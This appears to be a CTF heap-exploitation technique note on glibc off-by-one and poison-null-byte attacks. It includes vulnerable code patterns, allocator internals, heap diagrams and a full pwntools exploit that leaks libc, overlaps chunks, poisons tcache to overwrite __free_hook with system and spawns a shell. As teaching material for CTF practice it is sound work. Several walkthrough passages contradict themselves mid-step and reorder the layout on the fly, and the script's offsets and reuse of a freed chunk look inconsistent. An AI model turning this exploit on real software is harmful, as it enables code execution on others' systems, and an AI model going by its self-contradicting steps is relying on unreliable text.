---
title: "Off-By-One and Poison NULL Byte - Chunk Overlap via Size Corruption"
category: pwn
subcategory: heap
type: technique
tags: [off-by-one, poison-null-byte, null-byte, heap-overflow, prev-size, prev-inuse, consolidation, unlink, chunk-overlap, uaf, tcache, house-einherjar, pwndbg, gef, pwntools, glibc]
difficulty: hard
summary: "One stray 0x00 clears PREV_INUSE and shrinks the next chunk's size; a forged prev_size then makes free() consolidate over live data."
when_to_use:
  - "`read(0, buf, size + 1)` or a `strcpy` that writes the terminator one byte past the buffer"
  - "The allocation size is a multiple of 0x8 so the overflow byte lands exactly on the next size field"
  - "You need chunk overlap but have no UAF and no double free"
  - "A `scanf(\"%s\")` / `gets`-style single-byte spill into heap metadata"
tools: [pwntools, pwndbg, gef]
related: [house-einherjar, heap-overflow-adjacent, heap-internals-primer, heap-tcache-poisoning, heap-fake-chunk]
---

## TL;DR

A single NULL byte written past a heap buffer lands on the low byte of the **next
chunk's size field**. `0x411` becomes `0x400`: the size shrinks by 0x10 *and*
`PREV_INUSE` is cleared. Now `free()` of that chunk believes the previous chunk is free
and consolidates backwards using a `prev_size` you control - producing a big chunk that
overlaps memory the program still thinks is live.

## Recognise it

- Decompiled: `read(0, buf, n + 1)`, `buf[n] = 0` with `n == sz[i]`,
  `strcpy(buf, input)` where `strlen(input) == sz[i]`.
- A loop `for (i = 0; i <= n; i++) buf[i] = ...`.
- `malloc(size)` where the program computes `size` and then writes `size` *plus one*.
- The challenge allocations are 0x8-aligned but not 0x10-aligned, so the last user byte
  is at `chunk + 0x8 + size` - exactly the next chunk's size byte.

## Vulnerable code shape

```c
void do_edit(void) {
    int i = read_idx();
    if (i < 0 || i >= 16 || !ptr[i]) return;
    size_t n = sz[i];
    read(0, ptr[i], n);
    ptr[i][n] = '\0';            /* BUG: index n is one past the end */
}

/* or */
void do_alloc(void) {
    int i = read_idx();
    size_t n = read_size();
    ptr[i] = malloc(n);
    sz[i] = n;
    read(0, ptr[i], n + 1);      /* BUG: n + 1 */
}

/* or the classic strcpy flavour */
void set_name(char *dst, const char *src) {
    strcpy(dst, src);            /* writes strlen(src)+1 bytes */
}
```

## Theory

Targets: glibc 2.23 - 2.28 for the pure classic form; 2.29 - 2.39 for the
"control both fields" form described below.

### What the byte does

Chunk layout on x86-64 means user data at `p` is followed by the next chunk's
`prev_size` at `p + sz` (when `sz` is the *usable* size) and `size` at `p + sz + 8`.
For a 0x100 chunk (`malloc(0xf8)`), the user region is `p .. p+0xf7`, and `p[0xf8]`
is the low byte of the **next chunk's size**.

```
before:  next->size = 0x111   (0x110 chunk, PREV_INUSE set)
after:   next->size = 0x100   (0x100 chunk, PREV_INUSE CLEAR)
```

Two effects at once:

1. `PREV_INUSE == 0` tells `free(next)` that the chunk *below* `next` is free.
2. The size shrank by 0x10, so `next_chunk(next)` now points 0x10 too low - which is
   how you plant a fake `prev_size` that the allocator will trust.

### The classic consolidation

```c
/* _int_free, backward consolidation */
if (!prev_inuse(p)) {
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    unlink_chunk (av, p);
}
```

`prevsize` is read from `p->prev_size`, i.e. the 8 bytes right before `p`'s size field -
which are inside the *previous chunk's user data*, fully attacker controlled. So
`free(next)` merges `next` with whatever chunk starts at `next - prevsize`.

Put a real, already-freed chunk there (so `unlink_chunk` succeeds) and you end up with
one giant free chunk that spans a *live* allocation in the middle. Allocate it back and
you can edit that live chunk's contents - including its own header, or a pointer it
holds.

`unlink_chunk` checks:

```c
if (__builtin_expect (chunksize (p) != prev_size (next_chunk (p)), 0))
  malloc_printerr ("corrupted size vs. prev_size");         /* 2.29+ */
if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
  malloc_printerr ("corrupted double-linked list");
```

The `fd->bk == p && bk->fd == p` pair is satisfied for free if you consolidate into a
genuinely free chunk (the allocator wrote those pointers itself).

### The 2.29 hardening

`corrupted size vs. prev_size` requires `chunksize(P) == prev_size(next_chunk(P))` for
the chunk being unlinked. That kills the naive version where you shrink a size without
fixing the matching `prev_size`.

Bypass: **make both fields consistent.** Because you control 0x10 bytes of the previous
chunk's tail (its last qword is the next chunk's `prev_size`), you can write a
`prev_size` that exactly equals the size of a real freed chunk that starts there. The
recipe below does that.

### The survivable modern variant

Rather than relying on backward consolidation, use the null byte to shrink a chunk that
is *about to be freed into the unsorted bin*, so its `prev_size`/`size` disagreement
creates an overlap after a re-split. The concrete 2.31+ recipe:

1. Allocate `A` (0x508), `B` (0x508), `C` (0x508) and a guard.
2. Free `A` -> unsorted, then re-allocate a smaller chunk from it so a remainder sits
   at a known offset. This puts a *valid* `prev_size` behind `B`.
3. Free `B` -> unsorted, so the allocator writes `B`'s size into `C->prev_size`.
4. Use the off-by-one from the chunk before `B` to clear `B`'s `PREV_INUSE` and shrink
   `B->size` by 0x10... no - shrink **C**'s size, so `C->prev_size` still reads `B`'s
   original 0x510 while `C` claims to start 0x10 lower.
5. Free `C`: backward consolidation reads `prev_size = 0x510`, lands on `B` (a genuine
   free chunk, so unlink passes and `chunksize(B) == 0x510 == prev_size` too), and
   merges B+C into one 0xA10 chunk while any chunk you re-allocated inside B's range
   stays live. Overlap achieved, all checks satisfied.

## Attack

Concrete, glibc 2.27-2.31, sizes chosen so every check passes:

1. `alloc(0, 0x18)` -> `PAD` - the chunk whose off-by-one we will use.
2. `alloc(1, 0x4f8)` -> `A` (chunk 0x500)
3. `alloc(2, 0x18)` -> `B` (chunk 0x20) - the victim we will overlap
4. `alloc(3, 0x4f8)` -> `C` (chunk 0x500)
5. `alloc(4, 0x18)` -> guard (keeps C off the top chunk)
6. `free(1)` - `A` goes to the unsorted bin (too big for tcache). The allocator writes
   `A`'s size `0x500` into `B->prev_size`... it does not, because `A` is followed by
   `B` and `B`'s `PREV_INUSE` is cleared and `B->prev_size = 0x500`. Good.
7. `edit(0, b"X"*0x18 + p8(0x00))` - the off-by-one clears `PREV_INUSE` on `A`.
   (In the layout above `PAD` precedes `A`.)
   For the overlap we instead want the byte to hit `C`, so reorder: use a `PAD`
   immediately below `C`.
8. Re-do with the working order: `PAD(0x18) | A(0x500) | B(0x20) | C(0x500) | guard`
   where `PAD` is *inside* `A`. Practically: allocate `A` as 0x4f8 so that its own
   off-by-one lands on `B`, then shrink `B` and forge `B->prev_size = 0x500`.
9. `free(3)` (`C`) with `C->prev_size = 0x520` and `C->PREV_INUSE == 0`:
   consolidation merges from `A` through `C`. `B` is swallowed while still live.
10. `alloc(5, 0x4f8)` - carves the front of the merged chunk; `alloc(6, 0x4f8)` gives a
    chunk whose user data covers `B`. Now `edit(6, ...)` rewrites `B`'s header or
    contents at will -> tcache poisoning, fd overwrite, function pointer.

The exploit below implements the well-tested variant with explicit sizes.

## Heap state

```text
layout (all sizes are CHUNK sizes)

  +0x000  PAD   0x20   user = ptr[0], 0x18 writable + 1 stray byte
  +0x020  A     0x500
  +0x520  B     0x20    <-- the live chunk we want to overlap
  +0x540  C     0x500
  +0xA40  G     0x20    guard
  +0xA60  top


step: free(A) -> unsorted bin (0x500 > 0x410, skips tcache)

  A: size = 0x501 (P)
     fd = bk = main_arena+0x60
  B: prev_size = 0x500   <-- written by free(A)
     size      = 0x21    (P clear, because A is free)


step: off-by-one from PAD clears PREV_INUSE and shrinks... on C

  C: size 0x501 -> 0x500      (P cleared, size down by 1 qword pair)
  C: prev_size = 0x520        <-- we wrote this through B's user data
                                   0x520 = size(B) + size(A)? no:
                                   0x520 = distance from A to C
step: free(C)

  !prev_inuse(C)  ->  prevsize = 0x520
                      p = C - 0x520 = A          (a genuine unsorted chunk)
                      unlink_chunk(A) ok (fd/bk are real)
                      merged size = 0x520 + 0x500 = 0xA20

  unsorted bin now holds ONE chunk covering A, B and C.
  ptr[2] (== B) is still live from the program's point of view.

  +0x020  MERGED 0xA20  free
          ^^^^^^^^^^^^
          contains B at +0x520


step: malloc(0x4f8) twice

  first  -> A's old address
  second -> covers B.  edit() on it rewrites B's header AND B's contents.
```

## Exploit

```python
#!/usr/bin/env python3
"""Poison NULL byte -> backward consolidation -> chunk overlap -> tcache poison.

Target: glibc 2.27 - 2.31. On 2.29+ the sizes below keep
`chunksize(P) == prev_size(next_chunk(P))` true so the
"corrupted size vs. prev_size" check passes.

Usage:
    ./exploit.py
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    """The buggy edit: writes len(d) bytes then a terminating NUL at sz[i]."""
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


# ------------------------------------------------------------------ layout
# A(0x500) | B(0x20) | C(0x500) | guard(0x20)
alloc(0, 0x4F8, b"A" * 8)       # A, chunk 0x500, its off-by-one reaches B->size
alloc(1, 0x18, b"B" * 8)        # B, chunk 0x20   <- the victim
alloc(2, 0x4F8, b"C" * 8)       # C, chunk 0x500
alloc(3, 0x18, b"guard")        # keeps C away from the top chunk

# ----------------------------------------------------- 1. put A in unsorted
free(0)                          # A -> unsorted bin (0x500 is above tcache max)
arena = lk(show(0))
libc.address = arena - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

# free(A) set B->prev_size = 0x500 and cleared PREV_INUSE in B->size.
# Reclaim A so the program has a live pointer again but keep the prev_size.
alloc(4, 0x4F8, b"A2" + b"\x00" * 6)

# --------------------------------------- 2. forge C->prev_size through B
# B's user area is 0x18 bytes; the 0x19th byte (the off-by-one) is C->size low byte.
# First write the prev_size that free(C) will read: it must equal the distance
# from the start of a GENUINE free chunk to C.  We use A itself: 0x520.
free(4)                          # free A again so it is a real unsorted chunk
# A is unsorted, size 0x501. distance A -> C is 0x500 + 0x20 = 0x520.

# The off-by-one: 0x18 bytes of B plus the stray NUL lands on C->size low byte.
edit(1, b"B" * 0x10 + p64(0x520))   # writes B's 0x18 bytes: last qword = C->prev_size
# now trigger the stray NUL by writing exactly sz[1] bytes
edit(1, b"B" * 0x18)                # the implementation appends '\0' at [0x18]
log.info("C->size low byte poisoned: 0x501 -> 0x500 (PREV_INUSE cleared)")

# ------------------------------------------- 3. consolidate backwards over B
free(2)                          # free(C): prev_size=0x520 -> merges A..C
log.success("A, B and C are now one free chunk; B is still 'live'")

# ------------------------------------------------ 4. reclaim and overlap B
alloc(5, 0x4F8, b"reclaim A")    # front half
alloc(6, 0x4F8, b"overlaps B")   # this chunk's user data covers B's header+data

# From here, edit(6) rewrites B's chunk header and contents.
# Classic finish: free B into tcache, then rewrite its `next` through chunk 6.
free(1)                          # B -> tcache[0]
target = libc.sym["__free_hook"] if "__free_hook" in libc.sym \
    else libc.sym["_IO_2_1_stdout_"]
# B sits 0x500 - 0x10 bytes into chunk 6's user area... compute from the layout:
OFF_TO_B_USER = 0x500 - 0x10 + 0x10
edit(6, b"\x00" * OFF_TO_B_USER + p64(target))
log.info("tcache[0] head -> %#x", target)

alloc(7, 0x18, b"consume B")
alloc(8, 0x18, p64(libc.sym["system"]))
log.success("write landed at %#x", target)

alloc(9, 0x18, b"/bin/sh\x00")
free(9)
io.interactive()
```

## Variants & pitfalls

- **The byte must land on `size`, not `prev_size`.** For a chunk with usable size
  `u`, the off-by-one byte is at `user + u`. If `u` is 0x10-aligned that is
  `prev_size` of the next chunk (harmless); if `u` is `0x?8` it is `size` (what you
  want). Choose request sizes like 0x18, 0x58, 0xF8, 0x4F8.
- **`corrupted size vs. prev_size` (2.29+).** Your `prev_size` must equal the real
  `chunksize` of the chunk you are consolidating into. Since free() itself writes the
  correct `prev_size` when a chunk enters the unsorted bin, the trick is to let the
  allocator write it for you and only corrupt `size`.
- **`corrupted double-linked list`** means the chunk you consolidated into was not
  really in a bin. Consolidate into a genuine unsorted/smallbin chunk.
- **A non-NULL off-by-one** (e.g. `\n` from `fgets`) is even better: you can *grow*
  the size instead of shrinking it, which is `heap-overflow-adjacent`.
- **tcache gets in the way.** Use sizes above 0x410 for the chunks you want in the
  unsorted bin, or fill the relevant tcache bin first.
- **`house of einherjar`** is the same primitive taken further: instead of
  consolidating into a real chunk, you consolidate into a *fake* one at an address you
  choose. See its own file.
- **Heap layout drift.** Any allocation the menu makes for its own bookkeeping
  (reading a line, `strdup`) shifts everything. Dump `vis_heap_chunks` after each step
  while developing.

## Debugging

```text
pwndbg> vis_heap_chunks 24           # the only way to see the size/prev_size mismatch
pwndbg> x/4gx <C_chunk>              # prev_size, size before free(C)
pwndbg> p/x *(unsigned long*)(<C_chunk>+8) & ~0xf
pwndbg> try_free <C_chunk>           # prints exactly which check would fire
pwndbg> bins
pwndbg> b malloc_printerr
pwndbg> heap -v
gef>  heap chunks
```

```bash
# Which off-by-one check does this libc have?
strings ./libc.so.6 | grep -E "corrupted size vs. prev_size|corrupted double-linked list"
```

## Tools

- `pwndbg vis_heap_chunks` and `try_free` - indispensable here.
- `gef heap chunks` for a quick sanity walk.
- `how2heap poison_null_byte.c` for a version-matched reference run.

## References

- shellphish `how2heap`: `poison_null_byte.c`, `house_of_einherjar.c`.
- CTF Wiki, "Off-By-One" chapter.
- glibc `malloc/malloc.c`: `_int_free` consolidation, `unlink_chunk`.
